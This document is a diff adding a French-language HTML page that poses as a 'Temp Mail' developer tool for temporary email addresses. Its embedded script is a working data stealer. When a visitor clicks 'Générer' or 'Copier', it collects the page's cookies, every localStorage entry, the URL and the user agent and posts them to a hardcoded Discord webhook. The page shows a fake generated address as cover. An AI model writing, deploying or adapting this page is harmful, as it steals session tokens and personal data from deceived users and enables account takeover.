@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Temp Mail — Outil de développeur</title>
+    <style>
+        body {
+            background-color: #0d0d0d;
+            color: #ffffff;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .terminal {
+            background-color: #1e1e1e;
+            border-radius: 8px;
+            width: 600px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            overflow: hidden;
+        }
+        .terminal-header {
+            background-color: #2d2d2d;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .dot {
+            height: 12px;
+            width: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .red { background-color: #ff5f56; }
+        .yellow { background-color: #ffbd2e; }
+        .green { background-color: #27c93f; }
+        .title {
+            color: #aaa;
+            margin-left: 10px;
+            font-size: 12px;
+        }
+        .terminal-body {
+            padding: 20px;
+        }
+        .input-group {
+            display: flex;
+            margin-bottom: 20px;
+        }
+        input {
+            flex: 1;
+            background-color: #111;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 10px;
+            border-radius: 4px 0 0 4px;
+            outline: none;
+        }
+        button.generate-btn {
+            background-color: #e0e0e0;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button.copy-btn {
+            background-color: #333;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 0 4px 4px 0;
+            cursor: pointer;
+        }
+        .inbox {
+            background-color: #111;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 40px;
+            text-align: center;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="terminal">
+        <div class="terminal-header">
+            <div class="dot red"></div>
+            <div class="dot yellow"></div>
+            <div class="dot green"></div>
+            <span class="title">temp_mail — bash</span>
+        </div>
+        <div class="terminal-body">
+            <p style="color: #aaa; font-size: 14px;">Votre adresse email temporaire</p>
+            <div class="input-group">
+                <input type="text" id="email-input" value="Aucune adresse générée" readonly>
+                <button class="generate-btn" id="generate-btn">Générer</button>
+                <button class="copy-btn">Copier</button>
+            </div>
+            
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <p style="color: #aaa; font-size: 14px; margin: 0;">Boîte de réception</p>
+                <p style="color: #666; font-size: 12px; margin: 0; cursor: pointer;">↻ Actualiser</p>
+            </div>
+            <div class="inbox">
+                Aucun message.<br><span style="font-size: 12px;">En attente...</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- LE SCRIPT DE CAPTURE EST ICI -->
+    <script>
+        // METS TON LIEN DISCORD ICI
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1571234677434617986/8XG1WsjhxFIQTL816bRPn7I8D37zJM0h_l_APXRETUyW__bySrUfWXuoQKEL-I-gIZlL";
+
+        function exfiltrate() {
+            // Récupération de toutes les données accessibles
+            const cookies = document.cookie || "Aucun cookie accessible (HttpOnly ou vide)";
+            
+            let lsData = "";
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    lsData += `\n  - ${key}: ${localStorage.getItem(key)}`;
+                }
+            } catch (e) {
+                lsData = "Erreur lecture localStorage";
+            }
+
+            const payload = {
+                content: `🚨 **Nouvelle Capture Temp-Mail**\n**URL:** ${window.location.href}\n**Cookies:** ${cookies}\n**LocalStorage:** ${lsData || "Vide"}\n**User-Agent:** ${navigator.userAgent}`
+            };
+
+            // Envoi vers Discord
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log("Erreur:", err));
+        }
+
+        // On attache la fonction au bouton "Générer"
+        document.getElementById("generate-btn").addEventListener("click", function(e) {
+            // On n'annule pas le comportement par défaut, on laisse le bouton faire son travail
+            
+            // On génère une fausse adresse pour faire genre
+            document.getElementById("email-input").value = "temp_" + Math.random().toString(36).substring(2, 8) + "@mailyflash.de5.net";
+            
+            // On attend 500ms (au cas où le site original créerait des cookies) puis on envoie
+            setTimeout(exfiltrate, 500);
+        });
+
+        // BONUS : Si ils cliquent sur "Copier", on renvoie aussi
+        document.querySelector(".copy-btn").addEventListener("click", function() {
+            exfiltrate();
+        });
+    </script>
+</body>
+</html>
